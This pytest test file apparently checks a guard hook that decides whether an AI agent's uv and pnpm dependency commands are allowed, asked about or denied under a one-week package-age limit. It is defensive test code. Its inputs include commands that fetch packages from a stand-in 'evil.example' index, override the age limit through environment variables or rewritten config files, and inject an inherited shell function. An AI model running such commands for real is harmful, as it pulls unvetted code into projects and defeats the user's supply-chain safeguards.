"""uv dependency changes run inside the age limit; anything that could escape it or the project asks."""

import json
import os
import subprocess
import sys
from pathlib import Path

import pytest
from tests.hooks.system_programs import trust_directory, use_own_program, use_system_programs
from tests.runtime import REPO_ROOT, load_script_module

sys.path.insert(0, str(REPO_ROOT / "agents/hooks/lib"))
import dependency_settings

guard = load_script_module("agents/hooks/guard_command.py", "guard_command")
POLICY = json.loads((REPO_ROOT / "agents/command_permissions.json").read_text())["rules"]


@pytest.fixture(autouse=True)
def user_age_limit(tmp_path_factory: pytest.TempPathFactory, monkeypatch: pytest.MonkeyPatch) -> None:
    """The user's uv configuration refuses versions younger than a week, as the deployed one does."""
    config = tmp_path_factory.mktemp("config")
    (config / "uv").mkdir()
    (config / "uv" / "uv.toml").write_text('exclude-newer = "1 week"\n')
    monkeypatch.setenv("XDG_CONFIG_HOME", str(config))
    for name in [name for name in os.environ if name.startswith("UV_")]:
        monkeypatch.delenv(name)
    use_system_programs(config / "bin", monkeypatch, "uv")
    trust_directory(config / "bin", monkeypatch)


def judged(project: Path, command: str, kind: str) -> str:
    payload = {"cwd": str(project), "session_id": "s", "tool_name": "Bash", "tool_input": {"command": command}}
    return guard.decide(kind, payload).decision


def decisions(prefix: tuple[str, ...]) -> set[str]:
    return {rule["decision"] for rule in POLICY if tuple(rule["prefix"]) == prefix}


@pytest.mark.parametrize(
    "command",
    [
        "uv add httpx",
        "uv add httpx==0.27.0",
        'uv add "httpx>=0.27"',
        "uv add --group audit vulture",
        "uv lock --upgrade-package ruff",
        "uv lock --upgrade-package ruff==0.5.0",
        "uv add httpx && uv run --frozen pytest",
        "echo start && uv add httpx",
        "uv add 'httpx[http2]>=0.27,<1'",
        "uv add --group audit vulture --no-sync",
        "uv lock --upgrade",
        "uv lock -P ruff",
        "uv add zope.interface",
        "uv add backports.zoneinfo==0.2.1",
    ],
)
def test_uv_dependency_changes_inside_the_age_limit_run(git_project: Path, command: str) -> None:
    assert judged(git_project, command, "forbidden") == "allow"
    assert judged(git_project, command, "allowed") == "allow"


@pytest.mark.parametrize(
    "prefix",
    [
        ("pnpm", "add"),
        ("cargo", "add"),
        ("cargo", "update"),
        ("go", "get"),
        ("go", "mod", "tidy"),
        ("nix", "flake", "update"),
    ],
)
def test_dependency_changes_no_age_limit_guards_ask(prefix: tuple[str, ...]) -> None:
    assert decisions(prefix) == {"ask"}


@pytest.mark.parametrize(
    "command",
    [
        "uv add httpx --exclude-newer 2099-01-01",
        "uv add httpx --exclude-newer=2099-01-01",
        "uv add httpx --exclude-newer-package httpx=2099-01-01",
        "uv lock --upgrade --no-config",
        "uv add httpx --project /other/repo",
        "uv add httpx --directory=/other/repo",
        "uv add --script /other/tool.py httpx",
        "uv lock --upgrade --config-file /other/uv.toml",
        "UV_EXCLUDE_NEWER=2099-01-01 uv add httpx",
        "env UV_NO_CONFIG=1 uv add httpx",
        "export UV_EXCLUDE_NEWER=2099-01-01 && uv add httpx",
        "UV_EXCLUDE_NEWER=2099-01-01; export UV_EXCLUDE_NEWER; uv add httpx",
        "set -a; UV_NO_CONFIG=1; uv add httpx",
        "source settings.sh && uv add httpx",
        "cd /other/repo && uv add httpx",
        "(cd ../sibling; uv add httpx)",
        "pushd /x && uv lock --upgrade",
        "python3 write_settings.py && uv add httpx",
        "nohup uv add httpx",
        "git status && uv add httpx",
        "git apply p.diff && uv add httpx",
        "git checkout other -- pyproject.toml && uv add httpx",
        "printf 'x' > uv.toml && uv add httpx",
        "cat relaxed.toml > uv.toml && uv add httpx",
        "cat > uv.toml <<'EOF'\n[tool.uv]\nEOF\nuv add httpx",
        "uv add httpx > uv.toml",
        "uv add git+https://github.com/someone/pkg",
        "uv add https://example.com/pkg-1.0.tar.gz",
        "uv add ./vendor/pkg",
        "uv add /opt/pkg",
        "uv add ../pkg.whl",
        "uv add 'pkg @ https://example.com/pkg.whl'",
        "uv add pkg --index https://evil.example/simple",
        "uv add pkg --index=https://evil.example/simple",
        "uv add pkg --default-index https://evil.example/simple",
        "uv add pkg --index-url https://evil.example/simple",
        "uv add pkg --extra-index-url https://evil.example/simple",
        "uv add pkg -f https://evil.example/links",
        "uv add pkg --find-links /tmp/links",
        "uv add --editable ./pkg",
        "uv add pkg --rev main",
        "uv add pkg --branch main",
        "uv add pkg --tag v1",
        "uv add -r /other/requirements.txt",
        "uv add --requirements=/other/requirements.txt",
        "uv add -c constraints.txt httpx",
        "uv add -ihttps://evil.example/simple httpx",
        "uv add -i https://evil.example/simple httpx",
        "uv add --frozen-but-unknown httpx",
        "uv add 'httpx; python_version > \"3\"'",
        "uv add pkg@https://example.com/pkg.whl",
        "uv add owner/repo",
        "uv add 'C:\\pkg'",
        "uv run python w.py && uv add httpx",
        "uv sync && uv add httpx",
        "printf -v HOME /tmp/empty && uv add httpx",
        "uv add evil-1.0.tar.gz",
        "uv add evil-1.0-py3-none-any.whl",
        "uv add evil.zip",
        "uv add evil-1.0.tar.bz2",
        "uv add evil.egg",
        "uv add evil-1.0.tar.lz",
        "uv add evil-1.0.tar.lzma",
        "uv add evil-1.0.tlz",
        "uv add evil-1.0.tar.zst",
        "uv add evil-1.0.tzst",
        "uv add 'evil-1.0.TAR.GZ'",
        "uv add 'evil==1.0.tar.gz'",
        "uv lock --index https://evil.example/simple",
        "uv lock --check --index https://evil.example/simple",
        "uv lock -Pruff --index https://evil.example/simple",
        "uv lock -Uq",
        "cd /other && uv lock -Pruff",
    ],
)
def test_a_uv_change_that_could_escape_the_limit_or_the_project_asks(git_project: Path, command: str) -> None:
    assert judged(git_project, command, "allowed") == "ask"


@pytest.mark.parametrize("name", ["pyproject.toml", "uv.toml"])
def test_a_project_that_sets_its_own_age_limit_asks(git_project: Path, name: str) -> None:
    (git_project / name).write_text('[tool.uv]\nexclude-newer = "2099-01-01T00:00:00Z"\n')
    assert judged(git_project, "uv add httpx", "allowed") == "ask"


@pytest.mark.parametrize(
    "command",
    [
        "pnpm add -g cowsay",
        "pnpm add cowsay -g",
        "pnpm add cowsay -g=true",
        "pnpm add cowsay --global",
        "pnpm add cowsay --glob",
        "pnpm add cowsay --g",
        "pnpm add cowsay --gl=true",
        "pnpm --glo add cowsay",
        "pnpm add cowsay --global=true",
        "pnpm add cowsay --config.global=true",
        "pnpm add -Dg cowsay",
        "pnpm add cowsay --global-dir /tmp/g",
        "pnpm add cowsay --config.global-dir=/tmp/g",
        "pnpm --global add cowsay",
        "uv add --dev pytest",
        "uv add pytest --dev",
        "uv -q add --dev pytest",
        "uv --offline add pytest --dev",
        "uv --directory /x add --dev pytest",
    ],
)
def test_global_installs_and_the_legacy_dev_group_are_denied_wherever_the_flag_sits(
    git_project: Path, command: str
) -> None:
    assert judged(git_project, command, "forbidden") == "deny"


@pytest.mark.parametrize(
    "settings",
    [
        '[[tool.uv.index]]\nurl = "https://evil.example/simple"\n',
        '[tool.uv.sources]\npkg = { git = "https://github.com/someone/pkg" }\n',
        'index-url = "https://evil.example/simple"\n',
        '[tool.uv]\nindex = [{ url = "https://evil.example/simple" }]\n',
        '[tool.uv]\n"index-url" = "https://evil.example/simple"\n',
        '[tool]\nuv = { sources = { pkg = { path = "/opt/pkg" } } }\n',
        "[tool.uv\nbroken",
        '[tool.uv]\noverride-dependencies = ["pkg @ https://evil.example/pkg.whl"]\n',
        '[tool.uv]\nconstraint-dependencies = ["pkg<2"]\n',
        '[tool.uv]\ndev-dependencies = ["pkg"]\n',
        '[project]\nname = "x"\ndependencies = ["pkg @ git+https://github.com/someone/pkg"]\n',
        '[project.optional-dependencies]\nextra = ["pkg @ file:///opt/pkg"]\n',
        '[dependency-groups]\ndev = ["./vendor/pkg"]\n',
    ],
)
def test_a_project_that_adds_its_own_package_sources_asks(git_project: Path, settings: str) -> None:
    (git_project / "pyproject.toml").write_text(settings)
    assert judged(git_project, "uv add httpx", "allowed") == "ask"


def test_a_project_with_harmless_uv_settings_runs(git_project: Path) -> None:
    (git_project / "pyproject.toml").write_text('[project]\nname = "x"\n\n[tool.uv]\npackage = false\n')
    assert judged(git_project, "uv add httpx", "allowed") == "allow"


@pytest.mark.parametrize("command", ["uv lock --check", "uv lock --dry-run", "uv lock --locked", "uv lock"])
def test_uv_lock_without_an_upgrade_is_not_a_dependency_change(git_project: Path, command: str) -> None:
    (git_project / "pyproject.toml").write_text('[tool.uv]\nexclude-newer = "1 week"\n')
    assert judged(git_project, command, "allowed") == "allow"


@pytest.mark.parametrize(
    "name", ["UV_NO_CONFIG", "UV_EXCLUDE_NEWER", "UV_INDEX_URL", "UV_DEFAULT_INDEX", "UV_CONFIG_FILE"]
)
def test_an_inherited_uv_setting_asks(git_project: Path, monkeypatch: pytest.MonkeyPatch, name: str) -> None:
    monkeypatch.setenv(name, "1")
    assert judged(git_project, "uv add httpx", "allowed") == "ask"


def test_a_missing_user_age_limit_asks(git_project: Path, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "empty-config"))
    assert judged(git_project, "uv add httpx", "allowed") == "ask"


def test_a_project_above_the_worktree_asks(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    outer = tmp_path / "outer"
    inner = outer / "inner"
    inner.mkdir(parents=True)
    (outer / "pyproject.toml").write_text('[project]\nname = "outer"\n')
    subprocess.run(["git", "init", "--quiet", str(inner)], check=True)
    monkeypatch.setenv("AGENT_COMMAND_PERMISSIONS", str(REPO_ROOT / "agents/command_permissions.json"))
    assert judged(inner, "uv add httpx", "allowed") == "ask"


@pytest.mark.parametrize("program", ["ls", "cat file", "stat file"])
def test_a_program_found_through_path_beside_uv_asks(git_project: Path, program: str) -> None:
    assert judged(git_project, f"{program} && uv add httpx", "allowed") == "ask"


def test_a_uv_found_in_a_directory_the_session_writes_asks(git_project: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    use_own_program(git_project / ".venv" / "bin", monkeypatch, "uv")
    assert judged(git_project, "uv add httpx", "allowed") == "ask"


@pytest.mark.parametrize(
    "value",
    ["2099-01-01T00:00:00Z", "2099-01-01", "1 day", "6 days", "P1D", "PT1H", "soon"],
)
def test_a_user_limit_shorter_than_a_week_asks(git_project: Path, value: str) -> None:
    config = Path(os.environ["XDG_CONFIG_HOME"]) / "uv" / "uv.toml"
    config.write_text(f'exclude-newer = "{value}"\n')
    assert judged(git_project, "uv add httpx", "allowed") == "ask"


@pytest.mark.parametrize(
    "value", ["1 week", "2 weeks", "7 days", "30 days", "P7D", "P1W", "2020-01-01", "2020-01-01T00:00:00Z"]
)
def test_a_user_limit_of_at_least_a_week_runs(git_project: Path, value: str) -> None:
    config = Path(os.environ["XDG_CONFIG_HOME"]) / "uv" / "uv.toml"
    config.write_text(f'exclude-newer = "{value}"\n')
    assert judged(git_project, "uv add httpx", "allowed") == "allow"


@pytest.mark.parametrize(
    "setting",
    [
        'find-links = ["/tmp/links"]',
        'index-url = "https://evil.example/simple"',
        'exclude-newer-package = { pkg = "2099-01-01" }',
    ],
)
def test_a_user_configuration_that_adds_a_source_asks(git_project: Path, setting: str) -> None:
    config = Path(os.environ["XDG_CONFIG_HOME"]) / "uv" / "uv.toml"
    config.write_text(f'exclude-newer = "1 week"\n{setting}\n')
    assert judged(git_project, "uv add httpx", "allowed") == "ask"


@pytest.mark.parametrize("name", ["pyproject.toml", "uv.toml", "uv.lock"])
def test_a_project_file_linked_outside_the_worktree_asks(
    git_project: Path, tmp_path_factory: pytest.TempPathFactory, name: str
) -> None:
    outside = tmp_path_factory.mktemp("outside") / name
    outside.write_text('[project]\nname = "x"\n' if name == "pyproject.toml" else "")
    (git_project / name).symlink_to(outside)
    assert judged(git_project, "uv add httpx", "allowed") == "ask"


def test_a_prefix_lookalike_assignment_before_uv_asks(git_project: Path) -> None:
    assert judged(git_project, "uvx=1 uv add httpx", "allowed") == "ask"


def test_an_inherited_shell_function_before_uv_asks(git_project: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("BASH_FUNC_uv%%", '() {  command uv --no-config "$@"; }')
    assert judged(git_project, "uv add httpx", "allowed") == "ask"


@pytest.mark.parametrize(
    "command",
    [
        "uv --directory /elsewhere add httpx",
        "uv --project ../other add httpx",
        "uv -q add httpx",
        "uv -v lock --upgrade",
    ],
)
def test_an_option_before_the_uv_subcommand_asks(git_project: Path, command: str) -> None:
    assert judged(git_project, command, "allowed") == "ask"


@pytest.mark.parametrize(
    "command", ["uv --version", "uv -V", "uv --help", "uv -q run --frozen pytest", "uv --directory sub sync --frozen"]
)
def test_an_option_before_a_subcommand_that_changes_nothing_is_not_judged(git_project: Path, command: str) -> None:
    assert judged(git_project, command, "allowed") == "allow"


def test_a_system_uv_configuration_that_adds_a_source_asks(
    git_project: Path, monkeypatch: pytest.MonkeyPatch, tmp_path_factory: pytest.TempPathFactory
) -> None:
    system = tmp_path_factory.mktemp("xdg-system")
    (system / "uv").mkdir()
    (system / "uv" / "uv.toml").write_text('find-links = ["/tmp/links"]\n')
    monkeypatch.setenv("XDG_CONFIG_DIRS", str(system))
    assert judged(git_project, "uv add httpx", "allowed") == "ask"


@pytest.mark.parametrize("name", ["GIT_WORK_TREE", "GIT_DIR"])
def test_an_inherited_git_location_before_uv_asks(
    git_project: Path, monkeypatch: pytest.MonkeyPatch, name: str
) -> None:
    monkeypatch.setenv(name, "/")
    assert judged(git_project, "uv add httpx", "allowed") == "ask"


def test_the_default_system_configuration_directory_is_read(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("XDG_CONFIG_DIRS", raising=False)
    assert Path("/etc/xdg/uv/uv.toml") in dependency_settings._system_settings()


@pytest.mark.parametrize("command", ["npm_config_global=true pnpm add cowsay", "NPM_CONFIG_GLOBAL=1 pnpm add cowsay"])
def test_a_pnpm_global_install_through_the_environment_is_denied(git_project: Path, command: str) -> None:
    assert judged(git_project, command, "allowed") == "deny"


@pytest.mark.parametrize("name", [".npmrc", "pnpm-workspace.yaml"])
def test_a_pnpm_global_install_through_project_settings_is_denied(git_project: Path, name: str) -> None:
    (git_project / name).write_text("global=true\n" if name == ".npmrc" else "global: true\n")
    assert judged(git_project, "pnpm add cowsay", "allowed") == "deny"


@pytest.mark.parametrize(
    "setting", ["global=false", "global-dir=/x", "global = false"], ids=["false", "directory", "spaced false"]
)
def test_a_pnpm_setting_that_does_not_turn_global_on_still_asks_normally(git_project: Path, setting: str) -> None:
    (git_project / ".npmrc").write_text(setting + "\n")
    assert judged(git_project, "pnpm add cowsay", "allowed") == "allow"


def test_an_explicitly_false_variable_is_not_denied(git_project: Path) -> None:
    assert judged(git_project, "npm_config_global=false pnpm add cowsay", "allowed") != "deny"


@pytest.mark.parametrize("name", ["npm_config_global", "NPM_CONFIG_GLOBAL"])
def test_an_inherited_global_variable_is_denied(git_project: Path, monkeypatch: pytest.MonkeyPatch, name: str) -> None:
    monkeypatch.setenv(name, "true")
    assert judged(git_project, "pnpm add cowsay", "allowed") == "deny"
